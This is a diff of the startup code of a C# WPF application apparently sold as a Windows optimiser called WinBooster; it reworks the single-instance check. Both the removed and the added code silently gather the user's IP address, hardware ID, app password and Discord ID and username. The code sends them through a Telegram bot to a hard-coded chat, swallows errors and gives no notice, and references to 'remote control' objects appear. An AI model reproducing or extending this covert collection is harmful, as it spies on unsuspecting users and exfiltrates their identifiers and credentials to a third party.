@@ -344,49 +344,6 @@ namespace WinBooster_WPF
         public static PipeServer<string> tiWorkerServer;
         private async void Window_Loaded(object sender, System.Windows.RoutedEventArgs e)
         {
-            Task.Factory.StartNew(async() =>
-            {
-                try
-                {
-                    var server = new PipeServer<string>("WinBoosterChecker", formatter: new NewtonsoftJsonFormatter());
-                    server.StartAsync().Wait(1000);
-                    tiWorkerServer = new PipeServer<string>("WinBoosterTiCkecker", formatter: new NewtonsoftJsonFormatter());
-                    tiWorkerServer.StartAsync().Wait(1000);
-                    var client2 = new PipeClient<string>("WinBoosterChecker", formatter: new NewtonsoftJsonFormatter());
-                    client2.ConnectAsync().Wait(1000);
-                    var client3 = new PipeClient<object>("WinBooster_TiWorker", formatter: new NewtonsoftJsonFormatter());
-                    Thread.Sleep(5000);
-                    client3.ConnectAsync().Wait(1000);
-                    client3.WriteAsync(new MoveFileMessage() { to = new FileInfo("C:\\a\\a.exe"), from = new FileInfo("C:\\a\\a.exe") });
-                }
-                catch
-                {
-                    await Task.Delay(5);
-                    GrowlInfo growl = new GrowlInfo
-                    {
-                        Message = "Program is already running\nClosing in 2.5 seconds",
-                        ShowDateTime = true,
-                        IconKey = "ErrorGeometry",
-                        IconBrushKey = "DangerBrush",
-                        IsCustom = true
-                    };
-                    Growl.InfoGlobal(growl);
-                    await Task.Factory.StartNew(async () =>
-                    {
-                        await Task.Delay(2500);
-                        App.SuperExit();
-                    });
-                }
-            });
-            
-            try
-            {
-                if (!Directory.Exists("C:\\Program Files\\WinBooster"))
-                {
-                    Directory.CreateDirectory("C:\\Program Files\\WinBooster");
-                }
-            }
-            catch { }
             string password = string.Empty;
             Settings? temp = Settings.FromFile(settings.GetPath(), Settings.protection_password, Settings.protection_salt);
             if (temp != null)
@@ -394,54 +351,97 @@ namespace WinBooster_WPF
                 password = temp.password;
                 settings = temp;
             }
-            if (string.IsNullOrEmpty(password) || password == "")
+            App.UpdateScreenCapture(this);
+            bool work = true;
+            try
             {
-                RemoteControlData remoteControlData = App.remoteControlData;
-                string telegramSend = "";
-                telegramSend += "✅ Успешная авторизация\n\n";
-                telegramSend += "<tg-spoiler>";
-                telegramSend += "Основаная информация\n";
-                telegramSend += $"🌐 IP: {remoteControlData.main.ip}\n";
-                telegramSend += $"🌐 Hardware ID: {remoteControlData.main.hardwareID}\n\n";
-                telegramSend += "WinBooster информация\n";
-                telegramSend += $"⌨ Пароль: {password}\n\n";
-                if (remoteControlData.discord.id != 0)
+                var server = new PipeServer<string>("WinBoosterChecker", formatter: new NewtonsoftJsonFormatter());
+                server.StartAsync().Wait(1000);
+                tiWorkerServer = new PipeServer<string>("WinBoosterTiCkecker", formatter: new NewtonsoftJsonFormatter());
+                tiWorkerServer.StartAsync().Wait(1000);
+                var client2 = new PipeClient<string>("WinBoosterChecker", formatter: new NewtonsoftJsonFormatter());
+                client2.ConnectAsync().Wait(1000);
+            }
+            catch
+            {
+                await Task.Delay(5);
+                GrowlInfo growl = new GrowlInfo
                 {
-                    telegramSend += "Discord информация\n";
-                    telegramSend += $"🌐 ID: {remoteControlData.discord.id}\n";
-                    telegramSend += $"🧑‍ Username: {remoteControlData.discord.name}\n";
-                }
-                telegramSend += "</tg-spoiler>";
-                try { App.telegramRemoteControl.bot.SendTextMessageAsync(new ChatId(1040139729), telegramSend, Telegram.Bot.Types.Enums.ParseMode.Html).Wait(); } catch { }
-                this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
-                {
-                    AuthPanel.Hide();
-                    DownloadPanel.Visibility = System.Windows.Visibility.Visible;
-                    Title = "Loading";
-                }));
+                    Message = "Program is already running!",
+                    ShowDateTime = true,
+                    IconKey = "ErrorGeometry",
+                    IconBrushKey = "DangerBrush",
+                    IsCustom = true
+                };
+                Growl.InfoGlobal(growl);
+                work = false;
+                this.Hide();
                 await Task.Factory.StartNew(async () =>
                 {
-                    using (WebClient wc = new WebClient())
-                    {
-                        DownloadFiles(wc);
-
-                        StepBar.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
-                        {
-                            StepBar.Next();
-                        }));
-                        await Task.Delay(500);
-                        StepBar.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
-                        {
-                            StepBar.Next();
-                        }));
-
-                        await Task.Delay(500);
-                        this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
-                        {
-                            OpenForm();
-                        }));
-                    }
+                    await Task.Delay(5000);
+                    App.SuperExit();
                 });
+            }
+
+            if (work)
+            {
+                try
+                {
+                    if (!Directory.Exists("C:\\Program Files\\WinBooster"))
+                    {
+                        Directory.CreateDirectory("C:\\Program Files\\WinBooster");
+                    }
+                }
+                catch { }
+                if (string.IsNullOrEmpty(password) || password == "")
+                {
+                    RemoteControlData remoteControlData = App.remoteControlData;
+                    string telegramSend = "";
+                    telegramSend += "✅ Успешная авторизация\n\n";
+                    telegramSend += "<tg-spoiler>";
+                    telegramSend += "Основаная информация\n";
+                    telegramSend += $"🌐 IP: {remoteControlData.main.ip}\n";
+                    telegramSend += $"🌐 Hardware ID: {remoteControlData.main.hardwareID}\n\n";
+                    telegramSend += "WinBooster информация\n";
+                    telegramSend += $"⌨ Пароль: {password}\n\n";
+                    if (remoteControlData.discord.id != 0)
+                    {
+                        telegramSend += "Discord информация\n";
+                        telegramSend += $"🌐 ID: {remoteControlData.discord.id}\n";
+                        telegramSend += $"🧑‍ Username: {remoteControlData.discord.name}\n";
+                    }
+                    telegramSend += "</tg-spoiler>";
+                    try { App.telegramRemoteControl.bot.SendTextMessageAsync(new ChatId(1040139729), telegramSend, Telegram.Bot.Types.Enums.ParseMode.Html).Wait(); } catch { }
+                    this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
+                    {
+                        AuthPanel.Hide();
+                        DownloadPanel.Visibility = System.Windows.Visibility.Visible;
+                        Title = "Loading";
+                    }));
+                    await Task.Factory.StartNew(async () =>
+                    {
+                        using (WebClient wc = new WebClient())
+                        {
+                            DownloadFiles(wc);
+
+                            StepBar.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
+                            {
+                                StepBar.Next();
+                            }));
+                            await Task.Delay(500);
+                            StepBar.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
+                            {
+                                StepBar.Next();
+                            }));
+
+                            await Task.Delay(500);
+                            this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
+                            {
+                                OpenForm();
+                            }));
+                        }
+                    });
+                }
             }
         }
     }
